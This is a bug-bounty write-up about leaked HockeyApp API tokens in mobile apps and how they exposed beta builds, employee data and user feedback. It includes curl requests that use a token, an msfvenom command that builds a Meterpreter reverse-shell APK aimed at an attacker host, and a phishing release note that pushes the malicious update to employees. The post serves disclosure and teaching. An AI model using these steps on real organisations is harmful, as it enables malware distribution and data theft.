---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-06_saying-goodbye-to-my-favorite-5-minute-p1.md
original_filename: 2020-01-06_saying-goodbye-to-my-favorite-5-minute-p1.md
title: Saying Goodbye to my Favorite 5 Minute P1
category: documents
detected_topics:
- mobile-security
- supply-chain
- ssrf
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- mobile-security
- supply-chain
- ssrf
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: ad2e7c06ea73fb821657eca939619d039c2b182134b766a04372a0bcce7435fd
text_sha256: 9830f0ea87913a0edc17cb1ac7f2981fed4b533fe9feb61d9de4339e675fd680
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: true
---

# Saying Goodbye to my Favorite 5 Minute P1

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-06_saying-goodbye-to-my-favorite-5-minute-p1.md
- Source Type: markdown
- Detected Topics: mobile-security, supply-chain, ssrf, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: True
- Raw SHA256: `ad2e7c06ea73fb821657eca939619d039c2b182134b766a04372a0bcce7435fd`
- Text SHA256: `9830f0ea87913a0edc17cb1ac7f2981fed4b533fe9feb61d9de4339e675fd680`


## Content

---
title: "Saying Goodbye to my Favorite 5 Minute P1"
page_title: "Saying Goodbye to my Favorite 5 Minute P1 – allysonomalley.com"
url: "https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/"
final_url: "https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/"
authors: ["Allyson O'Malley (@ally_o_malley)"]
programs: ["Microsoft"]
bugs: ["Information disclosure"]
publication_date: "2020-01-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4841
---

In this post, I’m going to reveal the fastest, easiest P1 that I’ve ever reported – multiple times! It’s the sort of oversight that seems so simple to avoid, but surprisingly, it was pervasive across apps both with and without bug bounty programs. After realizing how widespread this security lapse was, I reported it to Microsoft and worked with them to warn users of its ugly consequences. With Microsoft’s go-ahead, I’m excited to finally make this post public! 

_Update: It came to my attention that not everyone reading may know what a ‘P1’ is. A ‘P1’ is a classification of a security vulnerability’s severity. Different organizations may have slightly different scales, but generally the severity scale goes from P5-P1, with P5 being ‘Very Low’ and P1 being ‘Critical’. Some scales range from P4-P0, where P0 is ‘Critical’ and P1 is ‘High’. In this post, I’m using the first scale, where a P1 is the maximum severity._

This bug ultimately**allowed me to fetch internal employee contact information, access internal beta builds for various apps, and – most critically – distribute malware directly to the devices of an organization’s employees under the guise of an internal app update complete with a notification letting everyone know that the update was ready!** I’ll first explain how and where I found this issue, then describe the types of information it disclosed. Then, I’ll provide a demo for the malware attack.

This bug certainly wasn’t complex, but it has treated me well over the past year. I’ve been able to report the same issue several times across Bugcrowd and directly to other internally run programs. Here are the results of two of these reports on Bugcrowd:

![](https://i1.wp.com/www.allysonomalley.com/wp-content/uploads/2020/01/hockey1-copy.png?fit=750%2C163&ssl=1) ![](https://i1.wp.com/www.allysonomalley.com/wp-content/uploads/2020/01/hockey2-copy.png?fit=750%2C153&ssl=1)

I also want to note that some of the screenshots I’ll be using in this post are taken from real reports I made. Since these were from private programs, they will be censored.

  

## Overview

  

#### The Death of HockeyApp

Those with experience developing mobile apps may have heard of the ‘HockeyApp’ platform – if you haven’t, it allowed an organization to distribute internal beta versions of their apps for testing. You can think of it as sort of a third party version of TestFlight. The majority of organizations seemed to use Hockey for distributing iOS and Android apps, but the platform also supported OS X, Windows, and Windows Phone apps, and even had a ‘Custom’ option as well. 

HockeyApp worked on iOS by using _Enterprise Certificates_ for large scale internal distribution. You probably know that Apple’s iOS, unlike Android, does not allow applications to be distributed outside of the official App Store. This restriction is strictly enforced via code signing. An enterprise certificate, however, is intended for exactly the scenario that HockeyApp provided for. To use the app, the user must install the developer’s profile, and explicitly allow the OS to trust its identity.

Developers could kick off a build on the command line, archiving their app, signing it, and compiling it into an .ipa or .apk file. They could then upload the .ipa/.apk through a web interface or via HockeyApp’s Developer API. Although HockeyApp provided the option to make an app publicly downloadable, the majority of companies appeared to lock it down as invitation only. Sometimes the invites were sent exclusively to the developer teams, but often, they were distributed to the organization’s employees at large. These builds were used to collect bug reports, metrics, and feedback before deploying to production.

#### 

  

The Problem

HockeyApp had two separate APIs available – one was the Client API, and the other was the **Developer API**. Any user added to the organization’s account with _‘Developer’_ access or higher was able to generate **API Tokens**. Even though these tokens were configurable to restrict access to certain apps, or certain actions (read only, upload only but unable to release, etc.), I personally never came across an organization that made use of this feature.

I’ve discovered these tokens in several places: either hard coded inside an app’s binary, left in a bash script included in the app’s sandbox by mistake, or in a .plist file. I first came across one a little over a year ago, and found another a few months later – I thought I had gotten incredibly lucky. Time passed, and I didn’t give this bug much thought. About two months ago, as I began to ponder ideas for a new blog post, this experience came to mind. I thought, “I haven’t looked for this bug in a while; maybe I should do one last sweep.” I scanned through some apps from bounty programs. To my surprise I found the same issue in an unusually high number of them. I started to look at other popular iOS and macOS apps that didn’t have bounty programs, and the disclosure seemed to be even more prevalent there!

Logically, of course it should have been clear that a token with any type of privileges should never be exposed. But to be fair to those app developers, the HockeyApp documentation did not place much emphasis on the seriousness of keeping these API tokens _secret_. I believe those omitted warnings, combined with the fact that a majority of users likely only ever used their tokens to fetch crash reports or upload builds via some years-old bash script, meant that they may not have been aware of the extent of the damage that a malicious actor could inflict with with a token.

#### 

  

Reporting to Microsoft

At this point, I found out that HockeyApp was scheduled to be deprecated on November 16, 2019. While I know that I surely can’t be the first person to ever report this bug, the amount of apps I found it in led me to believe that it was not very well-known. I decided to hold off on publishing this post until then to avoid landing anyone into danger. But when the 16th came and went, the HockeyApp platform remained accessible. It turned out that Microsoft would not move a portion of users off the platform for a few more months.

Once I realized that these users could still be at risk – and after getting some advice from the expert hacker [@rhyselsmore](https://twitter.com/rhyselsmore) – I reached out to the Microsoft Security Response Center to inform them of this widespread security lapse. The Microsoft team took the report seriously. After some discussion, they decided to update the documentation to emphasize and warn users of the importance of keeping their API tokens secure. Meanwhile, I reported the disclosure to all the exposed businesses I’d identified that had a security contact available.

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2020/01/Screen-Shot-2020-01-02-at-5.55.51-PM.png?fit=750%2C270&ssl=1)

## 

  

Reverse Engineering

  

One day, I received a new invitation to a bug bounty program with an iOS target listed as in scope. Perusing the assembly code, I noticed that on launch, the app was setting several constants for later use. Two of them caught my eye – both were random strings comprised of lowercase letters and numbers. As I traced the execution to where these tokens were later accessed, I came across several function names containing the name ‘HockeyApp’.

I was already familiar with HockeyApp, and looked to its documentation for more on its APIs. I tried to send a basic request using just the app identifier, which we’ll say was _‘2021bdf2671ab09174c1de5ad147ea2ba4’_
  
  
  curl https://rink.hockeyapp.net/api/2/apps/***REDACTED-SUSPECT-TOKEN***Of course, since the app in question was restricted to ‘private’, this request failed. As I prepared to move on, I remembered that HockeyApp also provided API tokens. From the docs:

> The **Developer API** is intended for developers to upload new builds, to manage data like crash reports, or in combination with third party libraries and apps. This API requires an API token for authentication. It should be accessed through the domain rink.hockeyapp.net.
> 
> Requests that require authentication need to set the HTTP header **X-HockeyAppToken** to a valid API token. Each user can create multiple tokens under the API Tokens in the account menu.

Returning to the app’s binary, I searched for _‘X-HockeyAppToken’_ , and quickly saw that it was referenced from the same function as one of the strings I’d found earlier.

![](https://www.allysonomalley.com/wp-content/uploads/2020/01/censored_thetoken-1024x455.png)

Now I was ready to try again; this time to see if the string I found was indeed a valid API token:
  
  
  curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/***REDACTED-SUSPECT-TOKEN***I got back a response! It appeared to be a .plist file with some basic information matching the app I was testing:
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"  
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
  <plist version="1.0">
  <dict>
  <string>software-package</string>
  <key>url</key>
  <string>https://rink.hockeyapp.net/api/
  apps/2021bdf2671ab09174c1de5ad147ea2ba4/app_versions/
  344?format=ipa&amp;pltoken=***REDACTED-SUSPECT-TOKEN***  &amp;avtoken=***REDACTED-SUSPECT-TOKEN***  &amp;download_origin=hockeyapp</string>
  </dict>
  ...
  <key>url</key>
  <string>https://rink.hockeyapp.net/api/2
  /apps/2021bdf2671ab09174c1de5ad147ea2ba4?format=png</string>
  ...
  <key>metadata</key>
  <dict>
  <key>bundle-identifier</key>
  <string>com.ecorp.beta</string>
  <key>bundle-version</key>
  <string>1101</string>
  <key>subtitle</key>
  <string>1.2.3 (1101)</string>
  <key>title</key>
  <string>ECorp iOS</string>
  <dict>
  </plist>
  

Of interest was the app name, bundle identifier, version, and the _‘software-package’_ URL. I copied and pasted the full URL in my browser, and a download automatically began – it was the full .ipa of the most recent beta app version. I tried plugging different version numbers into the URL instead of _‘1101’_ , and found that I was able to download any previous builds as well – gaining access to each previous version going back to the beginning. I would have been able to peruse the code of every old internal beta build for the app, and sideload them onto my device.

While I thought this issue alone could be worth reporting, I decided to keep investigating.

## 

  

Sensitive Information Disclosure

  

I also recalled from the API documentation that these tokens were configurable to have various levels of access:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-22-at-4.22.18-PM.png?fit=750%2C176&ssl=1)

At this point, I thought that the developer team certainly must have restricted this token. At most, I was hoping I could extract some sensitive information from the API. Even if it just had read-only access, it still should not have been exposed.

The next endpoint I tried was the**/_apps_** endpoint, which gave me back a list of all of the organization’s internal apps, along with their basic data.

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/listapps_redacted-1.png)A portion of an /apps endpoint response – you can see that I have circled one of the organization’s iOS apps, and one of their Android apps.

From this response, I was able to gather: _a full list of the organization’s apps and their bundle identifiers, the full name of the owner of each app, and each app’s unique identifier._

####  
Developer Notes and Commit Messages

Next, I was able to dig deeper into individual apps:
  
  
  curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4/app_versions?include_build_urls=true
  

This part was where the really interesting information came in. I received back a massive response, outlining each app version ever uploaded, along with the release notes for each. These release notes usually comprised of all of the commit messages for new commits going into the build, along with the author of each commit (full name and email) and its hash. The messages were often very descriptive, and ended up divulging sensitive information on their own. In the last couple of reports I’ve made on this bug, these tidbits revealed:

  * A URL for an internal Jenkins instance
  * URLs to the company’s internal Github repo
  * URLs to internal Jira instances, along with various ticket IDs
  * Comments containing information on internal build/release pipelines, planned features, security fixes, and more

Here is a small, redacted snippet of one such response:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/commits_censored.png?fit=750%2C179&ssl=1)

####  
Listing Users

Here was another fun endpoint:
  
  
  curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4/app_users
  

Here I was able to list every employee who was invited to the app, including their **email address, full name, who invited them and when, and their assigned role** :

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/list_users_censored.png)

####  
Reading Feedback

Yet another endpoint of interest was the _**/feedback**_ endpoint:

![](https://i1.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-22-at-6.04.29-PM.png?fit=750%2C126&ssl=1)

Although this endpoint may not seem particularly important at first, it could absolutely be considered sensitive, as it gave me access to user data that was intended for the developer’s eyes only.
  
  
  curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4/feedback
  

I forgot to capture a good screenshot of a response at the time, but below was the example response given in HockeyApp’s API reference:
  
  
  Status: 200
  {
  "feedback": [
  {
  "name": "John Appleseed",
  "email": "johnappleseed@icloud.com",
  "id": 123,
  "created_at": "2013-07-03T12:13:23Z",
  "messages": [
  {
  "subject": "Search",
  "text": "When performing a search, it would be nice if it shows only results that matches the search criteria.",
  "oem": "Apple",
  "model": "x86_64",
  "os_version": "10.8.5",
  "created_at": "2013-07-03T12:13:23Z",
  "id": 456,
  "token": "1234567890abcdef1234567890abcdef88",
  "via": 1,
  "user_string": null,
  "internal": null,
  "clean_text": "When performing a search, it would be nice if it shows only results that matches the search criteria.",
  "app_id": "567120abcdef1234567540abcdef123456",
  "app_version_id": 23
  },
  {
  "subject": "Re: Search",
  "text": "Thanks for the feedback, we will investigate this problem.",
  ............
  

Note the disclosure of:

  * The correspondence between the user and the developer
  * The user’s device type, model, and OS version

Here’s what I think could have been the most dangerous part of this endpoint:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-22-at-4.45.22-PM.png?fit=750%2C165&ssl=1)

It’s plausible that these attachments sent in by users could contain sensitive information – these would most likely be screenshots or screen recordings, which could reveal plenty of information on the user’s account and their content. I could also have downloaded these attachments and used something like exiftool to try to extract even more data.

## 

  

The Offensive

  

Here is the most critical part of this entire bug: when the leaked API token had upload/release privileges, I was able to **upload my own builds, notify all users to install them via email, and even force users to update!** I could, for example:

  * **Copy parts of the app’s UI, and upload a look-alike login page to phish employee credentials**
  * **Upload malware**
  * **Send emails impersonating the team responsible for the app with a custom message**

What makes this scenario so dangerous is not only that I could upload an app and hope that someone installs it._I could also notify all of the users that an update is ready with a custom message attached – all under the identity of the trusted internal team that develops the apps_. Once the app is installed, the damage could be limitless: I could silently steal critical authentication information, eavesdrop on internal conversations, gather information on internal networks, etc.

Of course, when I was finding these in the ‘real world’ or in bounty programs, I never went as far as uploading any builds – I confirmed what level of access I had, and then described the damage I could have caused. For the purpose of this post, I decided to create a little PoC for this step.

### 

  

Demo

I decided to use Android in this demo for a few reasons. First, the code signing restrictions are much less strict – I would have needed to create an Enterprise certificate for iOS, and then once a user installed my malicious app, they would’ve had to go into their settings and manually trust my profile. I could’ve tried to create the Enterprise cert in a way that at least looked similar to the target organization’s (same name, etc), but the odds of success would have been diminished. Second, Android is unfortunately the OS that gets regularly targeted with malware these days. Here are a few recent real world examples:

  * [Android Security Threat As ‘Unremovable’ Malware Infects 45,000 Phones So Far ](https://www.forbes.com/sites/daveywinder/2019/11/02/new-android-security-threat-as-unremovable-malware-infects-45000-phones-so-far/#444104e42340)
  * [Report: Millions of Android phones silently infected with malware through Samsung app scam](https://www.usatoday.com/story/tech/2019/07/10/25-million-android-phones-quietly-infected-malware-says-report/1690907001/)
  * [Android Warning: New Malware ‘Screen Records’ Banking Apps To Steal Passwords ](https://www.forbes.com/sites/zakdoffman/2019/07/08/warning-for-users-of-android-banking-apps-new-malware-is-recording-password-screens/#73b6449c60cb)

I created a demo Android application named _‘ECorpAndroid’_ – since I am not an Android developer, the app simply shows a white screen with the message ‘Hello World!’. We are going to pretend that this is the victim organization’s app, and that it is a real, fully functional application.

I uploaded the demo to Hockey as a new app, and installed this initial version on my Pixel, as you can see here:

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/Screenshot_20191112-211007-576x1024.png)

#### Embedding the RAT

Now, as the attacker, we’ve used the leaked API token to download the APK of ECorpAndroid’s most recent version from HockeyApp.

For this attack I could choose to create my own app from scratch – I could put in any functionality or content that I wanted or have it simply display a blank screen. However, the goal is to delay the discovery of our intrusion, and any employee who opens the app would instantly know that something is amiss. Luckily, a much more effective tactic exists – **with Metasploit’s Meterpreter payload, we can clone the target APK so that it will look and function exactly the same as the real app, but with our RAT (Remote Access Trojan) hidden inside of it.** This approach will make it much less likely that your average employee suspects that anything is wrong.

_(If you’re not familiar with Remote Access Trojans – they are essentially payloads that give the attacker remote access to the infected device. The Meterpreter is basically a RAT with many extra features built-in. The agent, or the ‘implant’, opens a communication channel with the attacker’s server (or ‘controller’), allowing the attacker to access the infected device remotely, where they can exfiltrate data or execute commands.)_

Now, we are ready to embed our RAT into a ‘clone’ of the ECorpAndroid APK that we downloaded earlier. Assuming that the IP of my server is _‘99.99.99.99’,_ we can run:
  
  
  msfvenom -x Downloads/ECorpAndroid.apk -p android/meterpreter/reverse_tcp LHOST=99.99.99.99 LPORT=4444 -o MaliciousClone.apk
  

We can see from the output that the original APK is decompiled, the payload is added, and new permissions are injected into the app’s _AndroidManifest.xml:_

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-24-at-10.56.55-PM-2-1024x541.png)

And finally, it will rebuild and sign the new APK for us.

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-24-at-10.57.17-PM-1.png?fit=750%2C181&ssl=1)

In order to clearly demonstrate this PoC, I modified our new app version’s UI before using Meterpreter – a real attacker, however, would almost certainly choose to create a seemingly identical copy of the victim’s application.

####  
Uploading the Malware

Back to the HockeyApp API docs: here is the information I needed in order to upload a new version of an app:

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/docs_upload-e1573709237580-1024x495.png)

There are the basic fields: the .ipa or .apk, and whatever release notes I want to include in the version description and notification email. Two other fields of interest:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/notify.png?fit=750%2C145&ssl=1)

As a hacker, I of course will want to select _“Notify all Testers”_ to maximize the number of victims. 

![](https://www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-22-at-6.00.58-PM-1024x140.png)

Another plus – I can block users from continuing to use the current app version, forcing them to install my new one.

An attacker would also want to keep the malware up for as long as possible before the developers discover it. With the API token, they also had the ability to remove users (except for the owner) from the app, allowing them to remove the developer team members before uploading their build! 

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screen-Shot-2019-11-22-at-6.03.05-PM.png?fit=750%2C133&ssl=1)

I never got the chance to test this endpoint out, but presumably it would mean that the removed users would no longer get email notifications for new updates.

####  
A Little Social Engineering

To pull this attack off, there is still one obstacle in my way. Regardless of whether the Android app is a debug or release build, the OS will refuse to install the update over the existing app unless the build is signed with the same key store as the original. For this PoC, I am assuming that the attacker has _NOT_ compromised the developer’s key store. Luckily, I can get around this problem, thanks to my ability to communicate with the users under the development team’s identity.

Now, I’ve got my malware infested APK ready to go. With the leaked API token and app identifier, I can upload an app update from the command line:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/upload_version_censored.png?fit=750%2C196&ssl=1)

Pay attention to the ‘notes’ field:

> Hello, due to some big changes to our database settings, we are asking that you first delete your currently installed version of this app before updating to this version – We expect that after this, you will see a noticeable performance improvement!

Sounds reasonable enough! It’s coming straight from the HockeyApp platform to your inbox! And when you click ‘Install’ from the email, you’re taken to the app’s page on Hockey’s website, where you can further see that this message is coming straight from the developers:

![](https://i0.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/email-1.png?ssl=1)

![](https://i2.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/website-2.png?ssl=1)

The app’s users should have no reason to suspect anything at this point, and are very likely to follow my instructions: first deleting the existing app, and then installing my malicious app in its place.

And finally, when our first victim opens the app…

![](https://i2.wp.com/www.allysonomalley.com/wp-content/uploads/2019/11/Screenshot_20191113-230858.png?fit=576%2C1024&ssl=1)

Note that this same approach of asking users to first delete the existing app before updating would also work on iOS. Once the users delete an existing app, the previously accepted profile is gone too, and they’ll need to go back and accept it again before reinstalling. However, we would need to apply for an enterprise certificate, impersonating the victim organization with the fake information fields, and somehow get that past Apple.

Instead of updating an existing app, this same attack could have also been done by creating a new app and inviting users to it via the API. Since the API token allowed the attacker to invite additional users to both new and existing apps, this approach could be especially useful in the case where the attacker wants to target a platform that the company does not already have an app for (for example, if the company only has an iOS app listed, but the attacker wants to distribute an Android app). The trade off is that an invite to a brand new app could seem peculiar, and might ring alarm bells. 

## 

  

Final Thoughts

  

In the end, this simple little mistake turned out to be a lot of fun to exploit. Here are two of my takeaways from this experience: the first is to never assume that a potential finding is ‘too easy’ or ‘too obvious’ to be important. At first, I assumed that the string I’d found was just an identifier, and that even if it were an API token, there was no way that a developer would leave it exposed if it had any dangerous permissions. Clearly, I was wrong! Sometimes it really is that easy.

Second, I think that this bug underscores the importance of getting familiar with the targets you’re hacking. This process includes taking the time to understand how developers think and work. If I hadn’t had my mobile development experience, I may have glossed over the API token and the potentially disastrous consequences of a HockeyApp breach.

Thanks for reading!

Categories: [Reverse Engineering](https://www.allysonomalley.com/category/pen-testing/reverse-engineering/)[Static Analysis](https://www.allysonomalley.com/category/pen-testing/static-analysis/)

Tags: [android](https://www.allysonomalley.com/tag/android/)[bug bounty](https://www.allysonomalley.com/tag/bug-bounty/)[hacking](https://www.allysonomalley.com/tag/hacking/)[ios](https://www.allysonomalley.com/tag/ios/)[malware](https://www.allysonomalley.com/tag/malware/)[mobile](https://www.allysonomalley.com/tag/mobile/)[p1](https://www.allysonomalley.com/tag/p1/)

[ ](https://www.facebook.com/sharer.php?u=https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/) [ ](http://twitter.com/share?url=https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/&text=Saying%20Goodbye%20to%20my%20Favorite%205%20Minute%20P1) [ ](mailto:?subject=Saying%20Goodbye%20to%20my%20Favorite%205%20Minute%20P1&body=https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)

* * *
